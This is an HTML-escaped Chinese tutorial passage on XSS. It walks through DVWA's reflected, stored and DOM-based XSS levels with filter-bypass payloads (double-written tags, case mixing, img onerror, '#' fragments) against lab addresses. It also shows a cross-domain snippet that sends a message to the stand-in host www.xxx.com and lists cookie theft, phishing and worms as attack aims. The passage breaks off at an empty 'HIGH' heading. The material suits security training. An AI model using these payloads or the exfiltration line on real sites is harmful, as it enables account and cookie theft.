&lt;li&gt;基于DOM的XSS跨站脚本攻击是通过修改页面的DOM节点数据信息而形成的XSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的JavaScript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;xssgong-ji-fang-shi&quot;&gt;XSS攻击方式&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;XSS盗取用户信息&lt;&#x2F;li&gt;
&lt;li&gt;XSS盗取cookie&lt;&#x2F;li&gt;
&lt;li&gt;XSS钓鱼攻击&lt;&#x2F;li&gt;
&lt;li&gt;XSS蠕虫攻击&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;liu-lan-qi-de-tong-yuan-ce-lue&quot;&gt;浏览器的同源策略&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;相同协议&lt;&#x2F;li&gt;
&lt;li&gt;相同域名&lt;&#x2F;li&gt;
&lt;li&gt;相同端口&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;kua-yu-ti-jiao&quot;&gt;跨域提交&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;img=new Image();&lt;&#x2F;li&gt;
&lt;li&gt;img.src=&amp;quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;get.asp?message=&amp;quot;+msg&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;ru-he-you-pian-dui-fang&quot;&gt;如何诱骗对方&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;URL变形&lt;&#x2F;li&gt;
&lt;li&gt;短链接变形&lt;&#x2F;li&gt;
&lt;li&gt;隐藏在其他页面中&lt;&#x2F;li&gt;
&lt;li&gt;……&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;xssruan-chong-gong-ji&quot;&gt;XSS蠕虫攻击&lt;&#x2F;h2&gt;
&lt;p&gt;XSS蠕虫的破坏力和影响力都是巨大的。XSS蠕虫主要发生在用户之间存在交互行为的页面中，当web应用程序对用户输入的数据信息没有做严格的过滤时，通过结合Ajax的异步提交，就可以实现在植入恶意代码的同时，将恶意代码进行对外发送，即实现代码的感染和传播，也就形成了XSS蠕虫。&lt;&#x2F;p&gt;
&lt;h1 id=&quot;dvwazhong-de-xss&quot;&gt;DVWA中的XSS&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;fan-she-xing-xss&quot;&gt;反射型XSS&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;low&quot;&gt;LOW&lt;&#x2F;h3&gt;
&lt;p&gt;服务器端核心代码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623599019963-d3f1d0b5-1745-4ce6-a622-c5f7b147bca4.png#align=left&amp;amp;display=inline&amp;amp;height=604&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-13%20%E4%B8%8B%E5%8D%8811.43.16.png&amp;amp;originHeight=604&amp;amp;originWidth=1892&amp;amp;size=78161&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1892&quot; alt=&quot;截屏2021-06-13 下午11.43.16.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。&lt;br &#x2F;&gt;漏洞利用&lt;br &#x2F;&gt;输入**&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;**，成功弹框：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623599187879-bc097765-291c-4861-bf77-09efa2e73350.png#align=left&amp;amp;display=inline&amp;amp;height=269&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=269&amp;amp;originWidth=592&amp;amp;size=30083&amp;amp;status=done&amp;amp;style=none&amp;amp;width=592&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;相应的XSS链接：&lt;br &#x2F;&gt;&lt;a href=&quot;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name=%3Cscript%3Ealert(&#x2F;xss&#x2F;)%3C%2Fscript%3E#&quot;&gt;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name=&lt;strong&gt;%3Cscript%3Ealert(&#x2F;xss&#x2F;)%3C%2Fscript%3E#&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;medium&quot;&gt;MEDIUM&lt;&#x2F;h3&gt;
&lt;p&gt;服务器端核心代码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623599299187-2d9ca7db-ffcb-430e-a1ec-1c77d5515e87.png#align=left&amp;amp;display=inline&amp;amp;height=428&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-13%20%E4%B8%8B%E5%8D%8811.48.06.png&amp;amp;originHeight=428&amp;amp;originWidth=1392&amp;amp;size=207239&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1392&quot; alt=&quot;截屏2021-06-13 下午11.48.06.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的&lt;script&gt;删除，这种防护机制是可以被轻松绕过的。&lt;br &#x2F;&gt;漏洞利用&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;双写绕过&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;输入**&amp;lt;sc&lt;script&gt;ript&amp;gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;**，成功弹框：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623599411714-03f6259b-3970-460d-a4df-0b8627e2784b.png#align=left&amp;amp;display=inline&amp;amp;height=318&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=318&amp;amp;originWidth=550&amp;amp;size=84653&amp;amp;status=done&amp;amp;style=none&amp;amp;width=550&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;相应的XSS链接&lt;br &#x2F;&gt;&lt;a href=&quot;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name=%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#&quot;&gt;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name=&lt;strong&gt;%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;大小写混淆绕过&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;输入**&lt;ScRipt&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;**，成功弹框：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623599490807-27d3fbff-4e30-48a1-9c57-e1c94bd915f8.png#align=left&amp;amp;display=inline&amp;amp;height=266&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=266&amp;amp;originWidth=598&amp;amp;size=80476&amp;amp;status=done&amp;amp;style=none&amp;amp;width=598&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;相应的XSS链接：&lt;br &#x2F;&gt;&lt;a href=&quot;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name=%3CScRipt%3Ealert(%2Fxss%2F)%3C%2Fscript%3E&quot;&gt;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name=&lt;strong&gt;%3CScRipt%3Ealert(%2Fxss%2F)%3C%2Fscript%3E&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;high&quot;&gt;HIGH&lt;&#x2F;h3&gt;
&lt;p&gt;服务器端核心代码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623599937932-d04cf5a0-8172-4e76-8fa6-0ecb411835d1.png#align=left&amp;amp;display=inline&amp;amp;height=430&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-13%20%E4%B8%8B%E5%8D%8811.58.17.png&amp;amp;originHeight=430&amp;amp;originWidth=1896&amp;amp;size=89159&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1896&quot; alt=&quot;截屏2021-06-13 下午11.58.17.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace()函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。&lt;br &#x2F;&gt;漏洞利用&lt;br &#x2F;&gt;虽然无法使用&lt;script&gt;标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。&lt;br &#x2F;&gt;输入**&amp;lt;img src=1 οnerrοr=alert(&#x2F;xss&#x2F;)&amp;gt;**，成功弹框：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623599643996-1d9db84d-8278-4721-bcc4-b3c93e71aa60.png#align=left&amp;amp;display=inline&amp;amp;height=243&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=243&amp;amp;originWidth=564&amp;amp;size=85567&amp;amp;status=done&amp;amp;style=none&amp;amp;width=564&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;相应的XSS链接：&lt;br &#x2F;&gt;&lt;a href=&quot;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name=%3Cimg+src%3D1+onerror%3Dalert%28%2Fxss%2F%29%3E#&quot;&gt;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name=&lt;strong&gt;%3Cimg+src%3D1+onerror%3Dalert%28%2Fxss%2F%29%3E#&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;impossible&quot;&gt;IMPOSSIBLE&lt;&#x2F;h3&gt;
&lt;p&gt;服务器端核心代码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623599961209-5bdc5a3d-4f7e-466a-ac1e-47d3dc00cb2d.png#align=left&amp;amp;display=inline&amp;amp;height=604&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-13%20%E4%B8%8B%E5%8D%8811.58.33.png&amp;amp;originHeight=604&amp;amp;originWidth=1894&amp;amp;size=134663&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1894&quot; alt=&quot;截屏2021-06-13 下午11.58.33.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;可以看到，Impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;amp;、”、 ’、&amp;lt;、&amp;gt;转换为HTML实体，防止浏览器将其作为HTML元素。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;cun-chu-xing-xss&quot;&gt;存储型XSS&lt;&#x2F;h2&gt;
&lt;p&gt;下面对四种级别的代码进行分析。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;low-1&quot;&gt;LOW&lt;&#x2F;h3&gt;
&lt;p&gt;服务器端核心代码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623600004510-644bdf93-d552-48ef-883a-31d8d32fe0b2.png#align=left&amp;amp;display=inline&amp;amp;height=738&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-13%20%E4%B8%8B%E5%8D%8811.59.44.png&amp;amp;originHeight=738&amp;amp;originWidth=1892&amp;amp;size=172936&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1892&quot; alt=&quot;截屏2021-06-13 下午11.59.44.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;相关函数介绍&lt;br &#x2F;&gt;trim(string,charlist)&lt;br &#x2F;&gt;函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。&lt;br &#x2F;&gt;mysql_real_escape_string(string,connection)&lt;br &#x2F;&gt;函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。&lt;br &#x2F;&gt;stripslashes(string)&lt;br &#x2F;&gt;函数删除字符串中的反斜杠。&lt;br &#x2F;&gt;可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。&lt;br &#x2F;&gt;漏洞利用&lt;br &#x2F;&gt;message一栏输入**&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;&lt;strong&gt;，成功弹框：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623600139389-a7c854c0-d296-4b3f-911a-5549b1fbf2e3.png#align=left&amp;amp;display=inline&amp;amp;height=275&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=275&amp;amp;originWidth=647&amp;amp;size=99380&amp;amp;status=done&amp;amp;style=none&amp;amp;width=647&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;name一栏前端有字数限制，抓包改为&lt;&#x2F;strong&gt;&lt;script&gt;alert(&#x2F;name&#x2F;)&lt;&#x2F;script&gt;**：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623600182635-4cdec2ad-5f5c-49b4-85d2-da288762715c.png#align=left&amp;amp;display=inline&amp;amp;height=291&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=291&amp;amp;originWidth=533&amp;amp;size=47105&amp;amp;status=done&amp;amp;style=none&amp;amp;width=533&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;成功弹窗&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623600234034-6f3c149f-2f2b-4972-a77a-ce07f07a0f47.png#align=left&amp;amp;display=inline&amp;amp;height=231&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=231&amp;amp;originWidth=593&amp;amp;size=80595&amp;amp;status=done&amp;amp;style=none&amp;amp;width=593&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;medium-1&quot;&gt;MEDIUM&lt;&#x2F;h3&gt;
&lt;p&gt;服务器端核心代码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623653413257-0b6c4239-63ce-4476-9729-70a6dcc8a5e2.png#align=left&amp;amp;display=inline&amp;amp;height=824&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%882.49.45.png&amp;amp;originHeight=824&amp;amp;originWidth=1674&amp;amp;size=197250&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1674&quot; alt=&quot;截屏2021-06-14 下午2.49.45.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;相关函数说明&lt;br &#x2F;&gt;strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用&lt;b&gt;标签。&lt;br &#x2F;&gt;addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。&lt;br &#x2F;&gt;可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS。&lt;br &#x2F;&gt;漏洞利用&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;双写绕过&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;抓包改name参数为**&amp;lt;sc&lt;script&gt;ript&amp;gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;**:&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623653632426-c9f4bd23-b53f-4614-8529-74546fcd5107.png#align=left&amp;amp;display=inline&amp;amp;height=302&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=302&amp;amp;originWidth=519&amp;amp;size=49000&amp;amp;status=done&amp;amp;style=none&amp;amp;width=519&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;成功弹框：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623653659823-6b97c34d-ae6d-4589-b74b-ec029a06c6e7.png#align=left&amp;amp;display=inline&amp;amp;height=222&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=222&amp;amp;originWidth=358&amp;amp;size=44187&amp;amp;status=done&amp;amp;style=none&amp;amp;width=358&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;大小写混淆绕过&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;抓包改name参数为**&lt;Script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;:**&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623653722480-0c75ca11-563c-46c1-b573-a639878faef2.png#align=left&amp;amp;display=inline&amp;amp;height=286&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=286&amp;amp;originWidth=529&amp;amp;size=47806&amp;amp;status=done&amp;amp;style=none&amp;amp;width=529&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;成功弹框：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623653752113-0c989b72-264f-4b4f-ab46-cf00441d0ab3.png#align=left&amp;amp;display=inline&amp;amp;height=277&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=277&amp;amp;originWidth=516&amp;amp;size=85120&amp;amp;status=done&amp;amp;style=none&amp;amp;width=516&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;high-1&quot;&gt;HIGH&lt;&#x2F;h3&gt;
&lt;p&gt;服务器端核心代码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623653842808-c8a38a7d-6f6a-41b1-beb3-682f8ef1b962.png#align=left&amp;amp;display=inline&amp;amp;height=824&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%882.57.08.png&amp;amp;originHeight=824&amp;amp;originWidth=1672&amp;amp;size=198902&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1672&quot; alt=&quot;截屏2021-06-14 下午2.57.08.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;可以看到，这里使用正则表达式过滤了&lt;script&gt;标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。&lt;br &#x2F;&gt;漏洞利用&lt;br &#x2F;&gt;抓包改name参数为**&amp;lt;img src=1 οnerrοr=alert(1)&amp;gt;**：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623653908920-58b00ed4-0aa9-4453-b1a5-55ecc1d353c6.png#align=left&amp;amp;display=inline&amp;amp;height=302&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=302&amp;amp;originWidth=530&amp;amp;size=47279&amp;amp;status=done&amp;amp;style=none&amp;amp;width=530&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;成功弹框：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623653951366-31649748-011e-4869-8a21-66105c65c73b.png#align=left&amp;amp;display=inline&amp;amp;height=238&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=238&amp;amp;originWidth=458&amp;amp;size=63263&amp;amp;status=done&amp;amp;style=none&amp;amp;width=458&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;impossible-1&quot;&gt;IMPOSSIBLE&lt;&#x2F;h3&gt;
&lt;p&gt;服务器端核心代码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623654061504-33c98e9c-a149-4e2c-a20f-8c6f50450b53.png#align=left&amp;amp;display=inline&amp;amp;height=1088&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%883.00.45.png&amp;amp;originHeight=1088&amp;amp;originWidth=1892&amp;amp;size=276316&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1892&quot; alt=&quot;截屏2021-06-14 下午3.00.45.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;可以看到，通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;domxing-xss&quot;&gt;DOM型XSS&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;low-2&quot;&gt;LOW&lt;&#x2F;h3&gt;
&lt;p&gt;服务器端核心代码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623853486858-4166d37a-e95d-4881-a077-f0f8dee92dfa.png#align=left&amp;amp;display=inline&amp;amp;height=848&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8810.24.12.png&amp;amp;originHeight=848&amp;amp;originWidth=1736&amp;amp;size=207130&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1736&quot; alt=&quot;截屏2021-06-16 下午10.24.12.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;漏洞利用&lt;br &#x2F;&gt;没有任何过滤，直接输入&lt;br &#x2F;&gt;&lt;a href=&quot;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default=%3Cscript%3Ealert()%3C&#x2F;script%3E&quot;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default=&lt;strong&gt;%3Cscript%3Ealert()%3C&#x2F;script%3E&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;即可&lt;&#x2F;p&gt;
&lt;h3 id=&quot;medium-2&quot;&gt;MEDIUM&lt;&#x2F;h3&gt;
&lt;p&gt;服务器端核心代码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623853779516-7e9b6eb1-0bb8-4721-936d-2abc86f6b2fe.png#align=left&amp;amp;display=inline&amp;amp;height=848&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8810.29.26.png&amp;amp;originHeight=848&amp;amp;originWidth=1736&amp;amp;size=259864&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1736&quot; alt=&quot;截屏2021-06-16 下午10.29.26.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;关于stripos&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623853965662-29999732-c1c8-4ff5-9f3a-4e3e1bf48078.png#align=left&amp;amp;display=inline&amp;amp;height=310&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8810.32.13.png&amp;amp;originHeight=876&amp;amp;originWidth=1050&amp;amp;size=108350&amp;amp;status=done&amp;amp;style=none&amp;amp;width=372&quot; alt=&quot;截屏2021-06-16 下午10.32.13.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;所以这里不允许出现&amp;lt;script的大小写形式&lt;br &#x2F;&gt;漏洞利用&lt;br &#x2F;&gt;观察网页源代码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623854179056-065682aa-74e1-4108-b7fb-1dbfa196caf5.png#align=left&amp;amp;display=inline&amp;amp;height=1662&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8810.35.51.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;size=731671&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-16 下午10.35.51.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;这里有两种绕过方式&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;使用#绕过&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;字符#后的数据不会发送到服务器端，从而绕过服务端过滤&lt;br &#x2F;&gt;&lt;strong&gt;?default=#%3Cscript%3Ealert(1)%3C&#x2F;script%3E&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;使用img标签&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;option &gt; &lt;&#x2F;select&gt;将之前的标签闭合，图片加载错误则执行alert&lt;br &#x2F;&gt;**?default=&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src=# onerror=alert(&quot;xss&quot;)&gt;**
### HIGH
